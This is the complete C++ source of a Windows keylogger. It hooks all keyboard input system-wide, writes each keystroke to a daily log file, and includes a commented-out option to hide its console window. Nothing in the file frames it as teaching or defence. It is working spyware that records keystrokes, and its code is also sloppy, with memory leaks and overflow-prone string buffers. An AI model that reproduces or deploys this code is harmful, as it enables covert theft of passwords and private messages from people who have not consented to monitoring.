#include <iostream>
#include <fstream>
#include <Windows.h>
#include <string>
#include <ctime>
#include <atlbase.h>
#include <atlconv.h>
#pragma comment(lib, "user32.lib")

using namespace std;

HHOOK keyboardHook = NULL;

fstream f;
char * logFolder = ".\\Logs\\";
char * filePath;

void openFile(char * fileName) 
{
	f.open(fileName, fstream::app);
}

void closeFile()
{
	if (f.is_open())
	{
		f.close();
	}
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION) 
	{
		if (wParam == WM_KEYDOWN) {
			wchar_t tmp[255] = {0};
			KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
						
			// Get key name as string
			DWORD msg = 1;
			msg += (keyInfo.scanCode << 16);
			msg += (keyInfo.flags << 24);
			GetKeyNameText(msg, tmp, 255);

			// Convert wchar_t to char *
			char* keyName = new char[20];
			wcstombs(keyName, tmp, 20);
			
			// add some special keys
			switch (keyInfo.vkCode)
			{
			case VK_LMENU:
				strcpy(keyName, "Left Alt");
				break;
			case VK_RMENU:
				strcpy(keyName, "Right Alt");
				break;
			case VK_LSHIFT:
				strcpy(keyName, "Left Shift");
				break;
			case VK_RSHIFT:
				strcpy(keyName, "Right Shift");
				break;
			case VK_LCONTROL:
				strcpy(keyName, "Left Control");
				break;
			case VK_RCONTROL:
				strcpy(keyName, "Right Control");
				break;	
			case VK_CAPITAL:
				strcpy(keyName, (GetKeyState(VK_CAPITAL)) ? "CAP_OFF" : "CAP_ON");
				break;
			}

			bool isSpecialKey = (strlen(keyName) <= 1) ? false : true;
			
			if (isSpecialKey)
			{
				char * keynametmp = new char[20];
				strcpy(keynametmp, "[");
				strcat(keynametmp, keyName);
				strcat(keynametmp, "]");
				strcpy(keyName, keynametmp);
			}

			openFile(filePath);			
			f << keyName << " ";
			closeFile();
		}
	}	
	
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void generateFilePath()
{
	time_t tNow = time(0);
	struct tm* now = localtime(&tNow);
	char* fileName = new char[15];
	strcpy(fileName, "");

	char* day = new char[4];
	itoa(now->tm_mday, day, 10);
	char* month = new char[3];
	itoa(now->tm_mon + 1, month, 10);
	char* year = new char[5];
	itoa(now->tm_year + 1900, year, 10);

	strcat(fileName, day);
	strcat(fileName, "-");
	strcat(fileName, month);
	strcat(fileName, "-");
	strcat(fileName, year);
	strcat(fileName, ".txt");

	filePath = new char[20];
	strcpy(filePath, "");

	strcat(filePath, logFolder);
	strcat(filePath, fileName);
	CreateDirectory(ATL::CA2W(logFolder), false);
}

int main(int argc, char* argv[])
{
	// hide console window
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	generateFilePath();
	cout << "Logs at: " << filePath << endl;

	//openFile(filePath);

	// HHOOK SetWindowsHookEx(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId)
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	if (keyboardHook == NULL) {
		std::cout << "Keyboard hook failed!" << std::endl;
	}

	cout << "Hooked successfully" << endl;
	
	// keep the program running
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	closeFile();
	UnhookWindowsHookEx(keyboardHook);
	return 0;
}